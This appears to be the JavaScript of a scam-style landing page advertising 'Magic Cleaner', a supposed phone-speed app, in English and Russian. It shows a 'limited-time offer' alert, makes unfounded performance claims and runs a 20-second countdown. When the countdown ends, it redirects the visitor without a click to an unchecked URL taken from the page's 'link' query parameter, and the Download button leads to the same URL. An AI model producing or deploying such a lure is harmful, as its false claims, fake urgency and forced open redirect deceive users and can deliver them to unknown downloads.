alert('Welcome! Limited-time offer just for you 🚀');


const translations = {
    en: {
        title: 'Boost your mobile by 50% with just 1-tap!',
        description:
            'Magic Cleaner is a utility to speed up your phone and optimize performance.',
        feature1: 'Clean up the memory and make phone faster!',
        feature2: 'Speed up memory in seconds',
        feature3: 'Stop background apps safely',
        step1: 'Tap "Download" button and install Magic Cleaner right now!',
        step2: 'Open application and enjoy!',
        download: 'DOWNLOAD',
        free: '100% FREE',
        footerPrefix: 'You have ',
        footerSuffix: ' to take advantage of this offer!',
        timer: '{m} minutes {s} seconds'
    },
    ru: {
        title: 'Ускорьте свой смартфон на 50% всего в 1 касание!',
        description:
            'Magic Cleaner — это утилита для ускорения и оптимизации работы вашего телефона.',
        feature1: 'Очистка памяти и ускорение телефона',
        feature2: 'Ускорение работы за считанные секунды',
        feature3: 'Безопасная остановка фоновых приложений',
        step1: 'Нажмите «Скачать» и установите Magic Cleaner прямо сейчас!',
        step2: 'Откройте приложение и наслаждайтесь!',
        download: 'СКАЧАТЬ',
        free: '100% БЕСПЛАТНО',
        footerPrefix: 'У вас есть ',
        footerSuffix: ', чтобы воспользоваться этим предложением!',
        timer: '{m} минут {s} секунд'
    }
};

function getLanguage() {
    return navigator.language.startsWith('ru') ? 'ru' : 'en';
}

let currentLang = 'en';

function renderFooter(lang) {
  const footerP = document.querySelector('.footer-text');
  footerP.innerHTML =
    translations[lang].footerPrefix +
    '<span id="timer">0</span>' +
    translations[lang].footerSuffix;
}

function applyTranslations() {
    currentLang = getLanguage();

    renderFooter(currentLang);

    const elements = document.querySelectorAll('[data-i18n]');

    elements.forEach(el => {
        const key = el.getAttribute('data-i18n');
        if (translations[currentLang][key]) {
            el.innerHTML = translations[currentLang][key];
        }
    });
}

applyTranslations();






const dateElement = document.querySelector('.date');

const today = new Date();
const options = {
    year: 'numeric',
    month: 'long',
    day: 'numeric'
};

dateElement.textContent = today.toLocaleDateString(undefined, options);




let timeLeft = 20;
const timerElement = document.getElementById('timer');

function updateTimer() {
    timerElement.textContent = formatTimer(currentLang, timeLeft);

    if (timeLeft <= 0) {
        clearInterval(timerInterval);
        redirectToLink();
        return;
    }

    timeLeft--;
}

function formatTimer(lang, secondsLeft) {
    const minutes = Math.floor(secondsLeft / 60);
    const seconds = secondsLeft % 60;

    return translations[lang].timer
        .replace('{m}', minutes)
        .replace('{s}', seconds);
}

const timerInterval = setInterval(updateTimer, 1000);
updateTimer();





function getRedirectLink() {
    const params = new URLSearchParams(window.location.search);
    const link = params.get('link');

    return link ? decodeURIComponent(link) : null;
}



const downloadBtn = document.querySelector('.btn-download');

function redirectToLink() {
    const link = getRedirectLink();

    if (link) {
        window.location.href = link;
    }
}

downloadBtn.addEventListener('click', redirectToLink);
